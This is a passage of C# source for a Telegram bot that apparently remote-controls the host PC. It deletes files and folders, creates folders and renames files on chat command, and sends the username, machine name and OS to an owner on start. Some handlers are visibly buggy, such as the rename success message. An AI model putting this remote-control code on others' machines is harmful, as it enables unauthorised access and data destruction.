                        StringBuilder commandsList = new StringBuilder("List of all commands:\n\n");
                        foreach (BotCommand command in commands.OrderBy(x => x.Command))
                        {
                            commandsList.AppendLine(command.Command);
                        }
                        commandsList.AppendLine("\nHold to copy command");
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, commandsList.ToString(), replyToMessageId: update.Message.MessageId);

                    });
                },
                Description = "Get all commands list sorted by alphabet"
            });

            //DELETE FILE
            commands.Add(new BotCommand
            {
                Command = "/deletefile",
                Description = "Delete file in path",
                Example = "/deletefile hello world.txt",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.RawArgs))
                            {
                                System.IO.File.Delete(model.RawArgs);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist.", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //CREATE FOLDER
            commands.Add(new BotCommand
            {
                Command = "/createfolder",
                Description = "/Create folder",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (!Directory.Exists(model.RawArgs))
                            {
                                Directory.CreateDirectory(model.RawArgs);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder already exists!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //DELETE FOLDER
            commands.Add(new BotCommand
            {
                Command = "/deletefolder",
                Description = "Delete folder.",
                Execute = async(model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (Directory.Exists(model.RawArgs))
                            {
                                Directory.Delete(model.RawArgs);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder does not exist!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //RENAME FILE
            commands.Add(new BotCommand
            {
                Command = "/renamefile",
                Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
                Example = "/renamefile C:\\Users\\User\\Documents\\oldname.txt newname.txt",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        if (System.IO.File.Exists(model.Args[0]))
                        {
                            string fileToRename = Path.GetFullPath(model.Args[0]);
                            string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
                            System.IO.File.Move(fileToRename, newFileName);
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder does not exist!", replyToMessageId: update.Message.MessageId);
                        }
                        else
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
                        }
                    });
                }
            });




            #endregion


            for (; ; )
            {
                try
                {
                    Run().Wait();
                }
                catch (Exception ex)
                {
                    Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
                }
            }
        }

        static async void ReportError(Update update, Exception exception)
        {
            if (Bot != null)
            {
#if DEBUG
                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: update.Message.MessageId);
#else
                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: " + exception.Message, replyToMessageId: update.Message.MessageId);
#endif
            }
        }



        static async Task Run()
        {
            if (OwnerId != null)
            {
                await Bot.SendTextMessageAsync(OwnerId,
                    $"🖥Computer online! \n\n" +
                    $"Username: *{Environment.UserName}*\n" +
                    $"PC name: *{Environment.MachineName}*\n\n" +

                    $"OS: {Environment.OSVersion.ToString()}",
                    ParseMode.Markdown);
            }
            var offset = 0;

            while (true)
            {
                var updates = await Bot.GetUpdatesAsync(offset);
                if (updates.Length != 0)
                    offset = updates.Last().Id + 1;

                UpdateWorker(updates).Wait();


                Task.Delay(500).Wait();
            }

        }


        public static async Task UpdateWorker(Update[] Updates)
        {

            foreach (var update in Updates)
            {
                if (update.Message == null || (update.Message.Text == null && update.Message.Caption == null))
                {
                    continue;
                }
                if (update.Message.Text != null && update.Message.Text.Contains("@" + Bot.GetMeAsync().Result.Username))
                {
                    update.Message.Text = update.Message.Text.Substring(0,
                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
                        update.Message.Text.Substring(
                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
                        ("@" + Bot.GetMeAsync().Result.Username).Length);
                }

                if (update.Message.Caption != null && update.Message.Caption.Contains("@" + Bot.GetMeAsync().Result.Username))
                {
                    update.Message.Caption = update.Message.Text.Substring(0,
                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
                        update.Message.Caption.Substring(
                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
                        ("@" + Bot.GetMeAsync().Result.Username).Length);
                }

                BotCommandModel model;
                if (update.Message.Type == MessageType.Text)
                {
                    model = BotCommand.Parse(update.Message.Text);
                }
                else
                {
                    model = BotCommand.Parse(update.Message.Caption);
                }
                if (model != null)
                {
                    foreach (var cmd in commands)
                    {
                        if (cmd.Command == model.Command)
                        {

                            if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
                            {
                                await Task.Run(() =>
                                {
                                    try
                                    {
                                        cmd.Execute.Invoke(model, update);
                                    }
                                    catch (Exception ex)
                                    {
                                        ReportError(update, ex);
                                    }
                                });

                            }
                            else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
                            {

                                await Task.Run(() =>
                                {
                                    try
                                    {
                                        cmd.Execute.Invoke(model, update);
                                    }
                                    catch (Exception ex)
                                    {
                                        ReportError(update, ex);
                                    }
                                });
                            }
                            else
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
                                     $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
                            }
                        }
                    }
                }

            }
        }
    }
}
